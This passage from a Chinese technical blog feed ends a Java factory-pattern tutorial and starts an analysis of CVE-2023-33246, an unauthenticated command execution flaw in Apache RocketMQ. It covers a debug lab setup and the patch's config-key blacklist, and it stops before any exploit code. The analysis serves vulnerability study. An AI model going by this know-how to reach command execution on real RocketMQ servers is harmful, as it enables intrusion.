class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//把Pizza类做成抽象类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Pizza</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//名字</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//准备原材料，不同的披萨不一样，因此，我们做成抽象方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bake</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; baking&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cut</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; cutting&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">box</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; boxing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreekPizza</span> <span class="keyword">extends</span> <span class="title class_">Pizza</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;给GreekPizza准备原材料&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CheessPizza</span> <span class="keyword">extends</span> <span class="title class_">Pizza</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;给CheessPizza准备原材料&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderPizza</span> &#123;</span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OrderPizza</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Pizza</span> <span class="variable">pizza</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        String orderType;<span class="comment">//订购披萨的类型</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            orderType = getType();</span><br><span class="line">            <span class="keyword">if</span> (orderType.equals(<span class="string">&quot;greek&quot;</span>)) &#123;</span><br><span class="line">                pizza = <span class="keyword">new</span> <span class="title class_">GreekPizza</span>();</span><br><span class="line">                pizza.setName(<span class="string">&quot;GreekPizza&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (orderType.equals(<span class="string">&quot;cheess&quot;</span>)) &#123;</span><br><span class="line">                pizza = <span class="keyword">new</span> <span class="title class_">CheessPizza</span>();</span><br><span class="line">                pizza.setName(<span class="string">&quot;CheessPizza&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//输出pizza制作过程</span></span><br><span class="line">            pizza.prepare();</span><br><span class="line">            pizza.bake();</span><br><span class="line">            pizza.cut();</span><br><span class="line">            pizza.box();</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写一个方法，可以获取客户希望订购的披萨种类</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">strin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line">            System.out.println(<span class="string">&quot;input pizza type:&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            str = strin.readLine();</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//相当于客户端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderStore</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">OrderPizza</span> <span class="variable">orderPizza</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderPizza</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>传统方式的优缺点</strong>：</p><ul><li>优点是比较好理解，简单易操作；</li><li>缺点是违反了设计模式的 OCP 原则，即对扩展开放，对修改关闭。即当我们给类增加新功能的时候，尽量不修改代码，或者尽量少修改代码；</li><li>比如这时我们要新增加一个 Pizza 的种类（Pepper 披萨），我们需要做的修改较大。</li></ul><p><strong>改进的思路分析</strong>：</p><ul><li>分析：修改代码可以接受，但是如果我们在其它的地方也有创建 Pizza 的代码，就意味着，也需要修改，而创建 Pizza 的代码，往往有多处；</li><li>思路：把创建 Pizza 对象封装到一个类中，这样我们有新的 Pizza 种类时，只需要修改该类就可，其它有创建到 Pizza 对象的代码就不需要修改了（使用简单工厂模式）。</li></ul><h2 id="0x02-简单工厂模式"><a href="#0x02-简单工厂模式" class="headerlink" title="0x02 简单工厂模式"></a>0x02 简单工厂模式</h2><p>简单工厂模式是属于创建型模式，是工厂模式的一种。简单工厂模式是由一个工厂对象决定创建出哪一种产品类的实例。简单工厂模式是工厂模式家族中最简单实用的模式。</p><p>简单工厂模式：定义了一个创建对象的类，由这个类来封装实例化对象的行为。<br>在软件开发中，当我们会用到大量的创建某种、某类或者谋批对象时，就会使用到工厂模式。</p><p>简单工厂模式的设计方案：定义一个可以实例化 Pizza 对象的类，封装创建对象的代码。</p><img src="/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/easyFactory.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单工厂类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFactory</span> &#123;</span><br><span class="line">    <span class="comment">//简单工厂模式，也叫静态工厂模式，可以用static修饰该方法</span></span><br><span class="line">    <span class="keyword">public</span> Pizza <span class="title function_">createPizza</span><span class="params">(String orderType)</span> &#123;</span><br><span class="line">        <span class="type">Pizza</span> <span class="variable">pizza</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (orderType.equals(<span class="string">&quot;greek&quot;</span>)) &#123;</span><br><span class="line">            pizza = <span class="keyword">new</span> <span class="title class_">GreekPizza</span>();</span><br><span class="line">            pizza.setName(<span class="string">&quot;GreekPizza&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (orderType.equals(<span class="string">&quot;cheess&quot;</span>)) &#123;</span><br><span class="line">            pizza = <span class="keyword">new</span> <span class="title class_">CheessPizza</span>();</span><br><span class="line">            pizza.setName(<span class="string">&quot;CheessPizza&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//输出pizza制作过程</span></span><br><span class="line">        pizza.prepare();</span><br><span class="line">        pizza.bake();</span><br><span class="line">        pizza.cut();</span><br><span class="line">        pizza.box();</span><br><span class="line">        <span class="keyword">return</span> pizza;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderPizza2</span> &#123;</span><br><span class="line">    <span class="comment">//定义一个简单工厂对象</span></span><br><span class="line">    SimpleFactory simpleFactory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OrderPizza2</span><span class="params">(SimpleFactory simpleFactory)</span> &#123;</span><br><span class="line">        setFactory(simpleFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Pizza</span> <span class="variable">pizza</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFactory</span><span class="params">(SimpleFactory simpleFactory)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">orderType</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;<span class="comment">//用户输入的</span></span><br><span class="line">        <span class="built_in">this</span>.simpleFactory = simpleFactory;<span class="comment">//设置简单工厂对象</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            orderType = getType();</span><br><span class="line">            pizza = <span class="built_in">this</span>.simpleFactory.createPizza(orderType);</span><br><span class="line">            <span class="comment">//输出pizza制作过程</span></span><br><span class="line">            <span class="keyword">if</span> (pizza != <span class="literal">null</span>) &#123;</span><br><span class="line">                pizza.prepare();</span><br><span class="line">                pizza.bake();</span><br><span class="line">                pizza.cut();</span><br><span class="line">                pizza.box();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;订购失败&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写一个方法，可以获取客户希望订购的披萨种类</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">strin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line">            System.out.println(<span class="string">&quot;input pizza type:&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            str = strin.readLine();</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//相当于客户端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderStore</span> &#123;    </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        </span><br><span class="line">    <span class="type">OrderPizza2</span> <span class="variable">orderPizza</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderPizza2</span>(<span class="keyword">new</span> <span class="title class_">SimpleFactory</span>());    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和之前的区别就在于把 <code>createPizza()</code> 方法封装到了其他类里面，其实是有点像 AOP 和静态代理的思想的。</p><h2 id="0x03-工厂方法模式"><a href="#0x03-工厂方法模式" class="headerlink" title="0x03 工厂方法模式"></a>0x03 工厂方法模式</h2><p>披萨项目新的需求：客户在点披萨时，可以点不同口味的披萨，比如“北京的奶酪披萨”、“北京的胡椒披萨”或者是“伦敦的奶酪披萨”、“伦敦的胡椒披萨”。</p><p><strong>思路一</strong>：使用简单工厂模式，创建不同的简单工厂类，比如 <code>BJPizzaSimpleFactory</code>、<code>LDPizzzaSimpleFactory</code> 等等，从当前这个案例来说，也是可以的，但是考虑到项目的规模，以及软件的可维护性 、可扩展性并不是特别好。</p><p><strong>思路二</strong>：使用工厂方法模式。将披萨项目的实例化功能抽象成抽象方法，在不同口味点餐子类中具体实现。</p><p>工厂方法模式定义了一个创建对象的抽象方法，由子类决定要实例化的类。工厂方法模式将对象的实例化推迟到子类。</p><img src="/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/FactoryMethods.png" class><p>因为代码很长，这里就不一一展示的，放到 GitHub Repo 中了 </p><p><a class="link" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/Java-Design-Mode">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/Java-Design-Mode<i class="fas fa-external-link-alt"></i></a></p><p>可以看到是定义了不同的类继承 Pizza 接口，再去实现这些接口，重写了对应方法。</p><h2 id="0x03-抽象工厂模式"><a href="#0x03-抽象工厂模式" class="headerlink" title="0x03 抽象工厂模式"></a>0x03 抽象工厂模式</h2><p><strong>抽象工厂模式</strong>：定义了一个 interface 用于创建相关或有依赖关系的对象簇，而无需指明具体的类。</p><p>抽线工厂模式可以将简单工厂模式和工厂方法模式进行整合。</p><p>从设计层面看，抽象工厂模式就是对简单工厂模式的改进（或者 称为进一步的抽象）。</p><p>将工厂抽象成两层，AbsFactory（抽象工厂）具体实现的工厂子类。程序员可以根据创建对象类型使用对应的工厂子类。这样将单个的简单工厂类变成了工厂簇，更利于代码的维护。</p><img src="/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/AbsFactory.png" class><h2 id="0x04-工厂模式小结"><a href="#0x04-工厂模式小结" class="headerlink" title="0x04 工厂模式小结"></a>0x04 工厂模式小结</h2><p><strong>工厂模式的意义</strong>：将实例化对象的代码提取出来，放到一个类中统一管理和维护，达到和主项目的依赖关系的解耦，从而提高项目的扩展和维护性。</p><p><strong>三种工厂模式</strong>：简单工厂模式、工厂方法模式、抽象工厂模式。</p><p><strong>设计模式的依赖抽象原则</strong>：</p><ul><li>创建对象实例时，不要直接new类，而是把这个new类的动作放在一个工厂的方法中，并返回。有的书上说，变量不要直接持有具体类的引用；</li><li>不要让类继承具体类，而是继承抽象类或者是实现interface（接口）；</li><li>不要覆盖基类中已经实现的方法。</li></ul><p>%%%%</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java 设计模式之工厂模式&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-33246 RocketMQ 漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-06-23T06:15:12.000Z</published>
    <updated>2023-06-30T17:15:28.332Z</updated>
    
    <content type="html"><![CDATA[<p>发一篇库存</p><span id="more"></span><p>这篇文章也发在了我们团队的公众号上：<a class="link" href="https://mp.weixin.qq.com/s/E3IiSiIyP6So5cg-dR8PyQ">https://mp.weixin.qq.com/s/E3IiSiIyP6So5cg-dR8PyQ<i class="fas fa-external-link-alt"></i></a></p><h1 id="CVE-2023-33246-漏洞分析"><a href="#CVE-2023-33246-漏洞分析" class="headerlink" title="CVE-2023-33246 漏洞分析"></a>CVE-2023-33246 漏洞分析</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>RocketMQ 5.1.0 及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ 的 NameServer、Broker、Controller 等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以 RocketMQ 运行的系统用户身份执行命令。  此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache RocketMQ &lt;&#x3D; 5.1.0</p><h2 id="漏洞基础"><a href="#漏洞基础" class="headerlink" title="漏洞基础"></a>漏洞基础</h2><h3 id="Apache-RocketMQ"><a href="#Apache-RocketMQ" class="headerlink" title="Apache RocketMQ"></a>Apache RocketMQ</h3><p>RocketMQ 是一个开源的分布式消息中间件系统，由阿里巴巴集团开发并贡献给 Apache 软件基金会，它主要用于解决高并发、高可用的场景下的消息通信问题。</p><ul><li>说白了我觉得从应用角度来说就是第二个 Kafka</li></ul><h3 id="RocketMQ-工作流程"><a href="#RocketMQ-工作流程" class="headerlink" title="RocketMQ 工作流程"></a>RocketMQ 工作流程</h3><p>1、生产者发送消息：生产者通过调用 RocketMQ 提供的 API 向指定 Topic 发送消息，消息可以是任何格式的数据。</p><p>2、Nameserver 服务注册：Nameserver 接收到 Broker 的注册信息，并将其存储在内存中。同时，Nameserver 还记录着所有 Topic 和 Queue 的路由信息。</p><p>3、消费者订阅消息：消费者通过订阅指定的 Topic 来接收消息。消费者可以选择同步或异步方式订阅消息，也可以根据自己的需求设置消费模式。</p><p>4、Broker 接收消息：经过负载均衡后，消息被发送到 Broker 中。每个 Broker 都会缓存一定数量的消息，以便快速响应消费者的请求。</p><p>5、消费者拉取消息：消费者定期从 Broker 中拉取消息。在拉取消息时，可以根据不同的消费模式进行消息消费。消费者可以在本地进行消息处理，也可以将消息传递给其他系统进行处理。</p><p>6、消息确认：消费者在消费完消息后，需要向 Broker 发送消息确认信息。消息确认可以帮助 Broker 删除已经被消费的消息，避免重复消费。</p><p>总的来说，RocketMQ 的工作流程包括了生产者发送消息、Nameserver 注册服务、消费者订阅消息、Broker 接收消息、消费者拉取消息和消息确认等步骤。通过这些步骤，RocketMQ 能够实现高效、可靠的消息传递和处理。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>docker-compose.yml</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">apache/rocketmq:4.9.4</span></span><br><span class="line">      <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">      <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">9555</span><span class="string">:9555</span></span><br><span class="line">      <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">JAVA_OPT:</span> <span class="string">&quot;-Xdebug -Xrunjdwp:transport=dt_socket,address=9555,server=y,suspend=n&quot;</span></span><br><span class="line">      <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">broker:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apache/rocketmq:4.9.4</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbroker</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10909</span><span class="string">:10909</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10911</span><span class="string">:10911</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10912</span><span class="string">:10912</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9556</span><span class="string">:9555</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">JAVA_OPT:</span> <span class="string">&quot;-Xdebug -Xrunjdwp:transport=dt_socket,address=9555,server=y,suspend=n&quot;</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqbroker</span> <span class="string">-n</span> <span class="string">namesrv:9876</span> <span class="string">-c</span> <span class="string">../conf/broker.conf</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8081</span><span class="string">:8081</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最开始这里是先去找 namesrv 处的漏洞的，但是发现打了断点之后一直走不过去，才发现是 Broker 组件处的问题，于是又加了 Broker 组件的断点调试。</p><p>且发现 Docker 的 5.1.0 版本有些问题，一直没有 debug 排错成功。</p><h2 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h2><h3 id="对于漏洞描述的思考"><a href="#对于漏洞描述的思考" class="headerlink" title="对于漏洞描述的思考"></a>对于漏洞描述的思考</h3><p>再看一遍漏洞描述，越看思考越多</p><ul><li><p>RocketMQ 5.1.0 及以下版本，在一定条件下，存在远程命令执行风险。</p></li><li><p>RocketMQ 的 NameServer、Broker、Controller 等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞，达到更新配置功能的效果。</p></li><li><p>以 RocketMQ 运行的系统用户身份执行命令。  此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。</p></li></ul><p>本质上是两点，需要先修改配置，再 RCE</p><p>漏洞信息给的相当模糊， 我猜测可能是 RocketMQ 里面本身自带有命令执行的地方，但是需要攻击者先构造越权。</p><p>和之前的漏洞分析不太一样，我并没有找到比较明显的 diff 代码</p><p>找了非常久的 diff 代码，终于找到一处可用的</p><p><a class="link" href="https://github.com/apache/rocketmq/commit/9d411cf04a695e7a3f41036e8377b0aa544d754d">https://github.com/apache/rocketmq/commit/9d411cf04a695e7a3f41036e8377b0aa544d754d<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://github.com/apache/rocketmq/commit/c3ada731405c5990c36bf58d50b3e61965300703">https://github.com/apache/rocketmq/commit/c3ada731405c5990c36bf58d50b3e61965300703<i class="fas fa-external-link-alt"></i></a> （和上面的版本，本质上是同一种东西）</p><p>这个的 diff 修复代码主要是做了一件事：不让 RocketMQ 在运行的时候能够更新 configPath，且增加了黑命单，黑名单如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brokerConfigPath </span><br><span class="line">configStorePath </span><br><span class="line">kvConfigPath </span><br><span class="line">configStorePathName</span><br></pre></td></tr></table></figure><p>后来在 4.9.6 的更新处又找到了另外一个地方</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/removeMoudleFilterServer.png" class><p><a class="link" href="https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc">https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc<i class="fas fa-external-link-alt"></i></a> （4.9.6）</p><p><a class="link" href="https://github.com/apache/rocketmq/commit/f1b411cecc3a9c441fdec2caf5867601419f3fc0">https://github.com/apache/rocketmq/commit/f1b411cecc3a9c441fdec2caf5867601419f3fc0<i class="fas fa-external-link-alt"></i></a> 